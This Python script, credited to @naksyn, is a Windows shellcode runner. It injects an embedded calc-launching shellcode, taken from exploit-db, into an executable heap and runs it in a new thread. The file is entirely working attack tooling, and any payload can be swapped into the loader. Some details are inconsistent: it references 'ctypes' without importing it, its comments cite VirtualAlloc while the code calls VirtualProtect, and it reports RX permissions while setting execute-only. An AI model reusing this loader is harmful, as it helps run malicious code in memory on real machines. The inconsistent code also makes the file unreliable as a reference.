"""
	Author: @naksyn

	BOF runner using Local shellcode injection with HeapAlloc()
        /CreateThread() and setting execute-only permissions with
	VirtualAlloc().
	Warning - stagers and shellcodes with self-decoding stubs
 	might not work, change permissions accordingly or remove
	VirtualProtect call by keeping RWX.

"""

from ctypes import *
from ctypes.wintypes import *

# Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)- Author Bobby Cooke @0xBoku - https://www.exploit-db.com/exploits/49819
calc = b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
calc += b"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
calc += b"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
calc += b"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
calc += b"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
calc += b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
calc += b"\x48\x83\xec\x20\x41\xff\xd6"

shellcode=calc
kernel32 = ctypes.windll.kernel32
isx64 = sizeof(c_void_p) == sizeof(c_ulonglong)

_kernel32 = WinDLL('kernel32')
HEAP_ZERO_MEMORY = 0x00000008
HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
PAGE_READ_EXECUTE = 0x20
PAGE_EXECUTE= 0x10
ULONG_PTR = c_ulonglong if isx64 else DWORD
SIZE_T = ULONG_PTR

# Functions Prototypes
VirtualProtect = _kernel32.VirtualProtect
VirtualProtect.restype = BOOL
VirtualProtect.argtypes = [ LPVOID, SIZE_T, DWORD, PDWORD ]

# HeapAlloc()
HeapAlloc = _kernel32.HeapAlloc
HeapAlloc.restype = LPVOID
HeapAlloc.argtypes = [ HANDLE, DWORD, SIZE_T ]

# HeapCreate()
HeapCreate = _kernel32.HeapCreate
HeapCreate.argtypes = [DWORD, SIZE_T, SIZE_T]
HeapCreate.restype = HANDLE

# RtlMoveMemory()
RtlMoveMemory = _kernel32.RtlMoveMemory
RtlMoveMemory.argtypes = [LPVOID, LPVOID, SIZE_T ]
RtlMoveMemory.restype = LPVOID

# CreateThread()
CreateThread = _kernel32.CreateThread
CreateThread.argtypes = [ LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, LPVOID ]
CreateThread.restype = HANDLE

# WaitForSingleObject()
WaitForSingleObject = _kernel32.WaitForSingleObject
WaitForSingleObject.argtypes = [HANDLE, DWORD]
WaitForSingleObject.restype = DWORD


heapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(shellcode), 0)
HeapAlloc(heapHandle, HEAP_ZERO_MEMORY, len(shellcode))
print('[+] Heap allocated at: {:08X}'.format(heapHandle))
RtlMoveMemory(heapHandle, shellcode, len(shellcode))
print('[+] Shellcode copied into memory.')

VirtualProtect(heapHandle, len(shellcode), PAGE_EXECUTE , ctypes.c_ulong(0))
print('[+] Set RX permissions on memory')
threadHandle = CreateThread(0, 0, heapHandle, 0, 0, 0)
print('[+] Executed Thread in current process.')
WaitForSingleObject(threadHandle, 0xFFFFFFFF)
